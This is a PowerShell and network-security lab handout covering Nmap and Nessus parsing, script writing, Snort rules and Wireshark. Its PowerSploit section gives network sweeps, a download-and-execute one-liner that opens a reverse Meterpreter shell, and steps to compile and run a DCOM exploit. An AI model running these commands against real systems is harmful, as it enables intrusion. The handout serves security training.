+.\parse-nmap.ps1 samplescan.xml | where {$_.Ports -like "*open:tcp:22*"}
+---------------------------------------------------------------
+
+Parsing with match and multiple conditions
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml |where {$_.Ports -match "open:tcp:80|open:tcp:443"}
+---------------------------------------------------------------
+
+
+CSV Export
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml -outputdelimiter " " | where {$_.Ports -match "open:tcp:80"} | export-csv weblisteners.csv
+---------------------------------------------------------------
+
+Import Data from CSV
+------------------------Type This------------------------------
+$data = import-csv weblisteners.csv
+$data | where {($_.IPv4 -like "10.57.*") -and ($_.Ports -match "open:tcp:22")}
+---------------------------------------------------------------
+
+
+Export to HTML
+------------------------Type This------------------------------
+.\parse-nmap.ps1 samplescan.xml -outputdelimiter " " |select-object IPv4,HostName,OS | ConvertTo-Html | out-file report.html
+---------------------------------------------------------------
+
+
+########################################
+# Parsing Nessus scans with PowerShell #
+########################################
+If you are NOT using the Win7 VM provided then you can get the required files for this lab which are located in this zip file:
+https://s3.amazonaws.com/infosecaddictsfiles/PowerShell-Files.zip
+
+
+
+Let's take a look at the Import-Csv cmdlet and what are the members of the object it returns:
+------------------------Type This------------------------------
+Import-Csv C:\class_nessus.csv | Get-Member
+---------------------------------------------------------------
+
+filter the objects:
+
+------------------------Type This------------------------------
+Import-Csv C:\class_nessus.csv | where {$_.risk -eq "high"}
+---------------------------------------------------------------
+
+use the Select-Object cmdlet and only get unique entries:
+------------------------Type This------------------------------
+Import-Csv C:\class_nessus.csv | where {$_.risk -eq "high"} | select host -Unique
+
+Import-Csv C:\class_nessus.csv | where {"high","medium","low" -contains $_.risk} | select "Plugin ID", CVE, CVSS, Risk, Host, Protocol, Port, Name | Out-GridView
+------------------------Type This------------------------------
+ 
+ConvertTo-Html cmdlet and turn it in to an HTML report in list format:
+------------------------Type This------------------------------
+Import-Csv C:\class_nessus.csv | where {"high","medium","low" -contains $_.risk} | select "Plugin ID", CVE, CVSS, Risk, Host, Protocol, Port, Name | ConvertTo-Html -As List > C:\report2.html
+---------------------------------------------------------------
+
+
+
+
+
+
+############################################
+# Introduction to scripting and toolmaking #
+############################################
+https://www.youtube.com/watch?v=usiqXcWb978
+
+Start the ISE
+
+
+CTRL+R
+
+
+
+
+
+
+
+
+Get-EventLog -LogName application
+
+
+------------------------------------------------------------------------------------------------
+--- Now run the script ---
+
+---------------------------Type This-----------------------------------
+
+.\GrabLogs.ps1
+
+
+------------------------------------------------------------------------------------------------
+
+
+
+$LogName="application"
+Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml
+
+
+
+
+--- Now run the script ---
+
+---------------------------Type This-----------------------------------
+
+.\GrabLogs.ps1
+
+
+------------------------------------------------------------------------------------------------
+
+
+param(
+    $LogName="application"
+)
+Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml
+
+
+
+--- Now run the script ---
+
+.\GrabLogs.ps1
+
+
+------------------------------------------------------------------------------------------------
+--- Now run the script ---
+
+.\GrabLogs.ps1 -L[ TAB Key ]
+
+.\GrabLogs.ps1 -LogName 		(you should now see LogName spelled out)
+
+
+.\GrabLogs.ps1 -LogName system
+
+
+------------------------------------------------------------------------------------------------
+
+
+
+param(
+    $LogName="application",
+    $Quantico
+)
+Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml
+
+
+
+------------------------------------------------------------------------------------------------
+--- Now run the script ---
+
+.\GrabLogs.ps1 -Q[ TAB Key ]
+
+.\GrabLogs.ps1 -Quantico 		(you should now see Quantico spelled out)
+
+
+
+
+------------------------------------------------------------------------------------------------
+--- Now get help on the script ---
+
+get-help .\GrabLogs.ps1
+GrabLogs.ps1 [[-LogName] <Object>] [[-Quantico] <Object>]
+
+
+
+
+------------------------------------------------------------------------------------------------
+param(
+    [string]$LogName="application",
+    $Quantico
+)
+Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml
+
+
+
+------------------------------------------------------------------------------------------------
+--- Now get help on the script ---
+
+get-help .\GrabLogs.ps1
+GrabLogs.ps1 [[-LogName] <String>] [[-Quantico] <Object>]
+
+
+
+
+------------------------------------------------------------------------------------------------
+param(
+    [string[]]$LogName="application",
+    $Quantico
+)
+Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml
+
+
+
+------------------------------------------------------------------------------------------------
+--- Now get help on the script ---
+
+get-help .\GrabLogs.ps1
+GrabLogs.ps1 [[-LogName] <String[]>] [[-Quantico] <Object>]
+
+
+
+------------------------------------------------------------------------------------------------
+[CmdletBinding()]
+param(
+    [Parameter(Mandatory=$True)]
+    $LogName
+)
+Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml
+
+
+
+------------------------------------------------------------------------------------------------
+--- Now run the script ---
+
+.\GrabLogs.ps1 
+
+
+
+
+
+------------------------------------------------------------------------------------------------
+[CmdletBinding()]
+param(
+    [Parameter(Mandatory=$True)]
+    $LogName
+)
+Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml
+
+
+
+
+
+------------------------------------------------------------------------------------------------
+<#
+
+.Synopsis
+This is a just a short explantion of the script
+
+.Description
+This is where provide a more information about how to use the script
+
+.Parameter LogName
+This is where you specify the names of different logs
+
+./Syntax
+GrabLogs.psl -LogName security
+
+
+.Example
+GrabLogs.psl -LogName security
+
+
+#>
+[CmdletBinding()]
+param(
+    [Parameter(Mandatory=$True)]
+    $LogName
+)
+Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml
+
+
+
+
+------------------------------------------------------------------------------------------------
+--- Now get help on the script ---
+
+get-help .\GrabLogs.ps1
+
+
+
+
+
+
+------------------------------------------------------------------------------------------------
+--- Now get help on the script ---
+get-help .\GrabLogs.ps1 -full
+
+
+
+
+
+
+
+<#
+
+.Synopsis
+This is a just a short explantion of the script
+
+.Description
+This is where provide a more information about how to use the script
+
+.Parameter LogName
+This is where you specify the names of different logs
+
+./Syntax
+GrabLogs.psl -LogName security
+
+
+.Example
+GrabLogs.psl -LogName security
+
+
+#>
+function Get-GrabLogs{
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$True)]
+        $LogName
+    )
+    Get-EventLog -LogName $LogName | Export-Clixml C:\Users\Workshop\Desktop\Scripts\$LogName.xml
+}
+
+####################################################
+# Running Powershell From A Command Prompt         #
+# Using Powersploit & Nishang			   #
+####################################################
+
+COMMAND & 1 PARAMATER SYNTAX:		
+	powershell -command "& {&'some-command' someParam}"
+
+
+
+MULTIPLE COMMAND & PARAMETER SYNTAX
+	powershell -command "& {&'some-command' someParam}"; "& {&'some-command' -SpecificArg someParam}"
+
+
+
+Tools to download to the web root (/var/www) of your infosecaddicts-Ubuntu-VM:
+git clone https://github.com/mattifestation/PowerSploit.git
+git clone https://github.com/samratashok/nishang
+
+from the infosecaddicts home dir copy nc.exe to /var/www/ folder
+
+user:infosecaddicts
+pass:infosecaddicts
+
+------------------------Type This------------------------------
+cd ~
+sudo cp nc.exe /var/www/
+
+cd /var/www/html/
+sudo git clone https://github.com/samratashok/nishang
+sudo git clone https://github.com/mattifestation/PowerSploit
+
+
+********************************** Simple Ping Sweep **********************************
+powershell -command "50..100 | % {\""192.168.150.$($_): $(Test-Connection -count 1 -comp 192.168.150.$($_) -quiet)\""}"
+
+
+
+
+
+********************************** Simple Port 445 Sweep **********************************
+powershell -command "1..255 | % { echo ((new-object Net.Sockets.TcpClient).Connect(\""192.168.150.$_\"",445)) \""192.168.150.$_\""} 2>$null"
+
+
+
+
+
+
+********************************** Simple Port Scan **********************************
+powershell -command "1..1024 | % { echo ((new-object Net.Sockets.TcpClient).Connect(\""192.168.150.XX\"",$_)) \""$_ is open\""} 2>$null"
+
+
+
+
+
+
+********************************** Powershell Download & Execute Reverse Meterpreter **********************************
+from ubuntu host browse to metasploit folder 
+cd ~/toolz/metasploit/
+
+sudo ./msfconsole
+use exploit/multi/handler
+set ExitOnSession false
+set payload windows/meterpreter/reverse_https
+set LHOST 192.168.150.129
+set LPORT 4443
+set EXITFUNC thread
+exploit -j
+
+
+
+powershell -command "IEX (New-Object Net.WebClient).DownloadString('https://s3.amazonaws.com/infosecaddictsfiles/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.150.129 -Lport 4443 -Force"
+
+
+
+
+
+
+
+#############################
+# Understanding Snort rules #
+#############################
+Field 1: Action - Snort can process events in 1 of 3 ways (alert, log, drop)
+ 
+Field 2: Protocol - Snort understands a few types of traffic (tcp, udp, icmp)
+ 
+Field 3: Source IP (can be a variable like $External_Net, or an IP, or a range)
+ 
+Field 4: Source Port (can be a variable like $WebServer_Ports, or a port number, or a range of ports)
+ 
+Field 5: Traffic Direction (->)
+ 
+Field 6: Destination IP (can be a variable like $External_Net, or an IP, or a range)
+ 
+Field 7: Destination Port (can be a variable like $WebServer_Ports, or a port number, or a range of ports)
+ 
+Field 8: MSG - what is actually displayed on the analysts machine
+ 
+ 
+Let's look at 2 simple rules
+----------------------------------------------------------------------------------
+alert tcp $EXTERNAL_NET any -> $HOME_NET 135 (msg:”NETBIOS DCERPC ISystemActivator \
+bind attempt”; flow:to_server,established; content:”|05|”; distance:0; within:1; \
+content:”|0b|”; distance:1; within:1; byte_test:1,&,1,0,relative; content:”|A0 01 00 \
+00 00 00 00 00 C0 00 00 00 00 00 00 46|”; distance:29; within:16; \
+reference:cve,CAN-2003-0352; classtype:attempted-admin; sid:2192; rev:1;)
+ 
+alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:”NETBIOS SMB DCERPC ISystemActivator bind \
+attempt”; flow:to_server,established; content:”|FF|SMB|25|”; nocase; offset:4; \
+depth:5; content:”|26 00|”; distance:56; within:2; content:”|5c \
+00|P|00|I|00|P|00|E|00 5c 00|”; nocase; distance:5; within:12; content:”|05|”; \
+distance:0; within:1; content:”|0b|”; distance:1; within:1; \
+byte_test:1,&,1,0,relative; content:”|A0 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 \
+46|”; distance:29; within:16; reference:cve,CAN-2003-0352; classtype:attempted-admin; \
+sid:2193; rev:1;)
+----------------------------------------------------------------------------------
+ 
+ 
+ 
+From your Linux machine ping your Windows machine
+ping 192.168.150.1
+ 
+ 
+ 
+Start wireshark and let's create some simple filters:
+ 
+Filter 1:
+ip.addr==192.168.150.1
+ 
+ 
+Filter 2:
+ip.addr==192.168.150.1 && icmp
+ 
+ 
+ 
+Filter 3:
+ip.addr==192.168.150.1 && !(tcp.port==22)
+ 
+Now stop your capture and restart it (make sure you keep the filter)
+ 
+ 
+ 
+ 
+Back to your Linux machine:
+[ CTRL-C ] - to stop your ping
+ 
+wget http://downloads.securityfocus.com/vulnerabilities/exploits/oc192-dcom.c
+ 
+ 
+gcc -o exploit oc192-dcom.c
+ 
+./exploit
+ 
+ 
+./exploit -d 192.168.150.1 -t 0
+ 
+ 
+ 
+ 
+Now go back to WireShark and stop the capture.
